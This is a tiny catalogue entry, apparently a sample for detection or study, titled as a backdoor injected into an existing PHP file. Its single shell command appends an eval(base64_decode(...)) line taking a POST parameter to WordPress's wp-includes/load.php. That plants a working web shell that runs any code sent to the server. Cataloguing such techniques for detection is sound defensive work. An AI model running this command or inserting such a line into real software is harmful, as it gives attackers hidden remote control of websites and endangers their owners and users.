# category: web
# title: Backdoor injected into an existing PHP file
# indicator: wp-includes/load.php
echo 'eval(base64_decode($_POST["k"]));' >>/var/www/wp/wp-includes/load.php
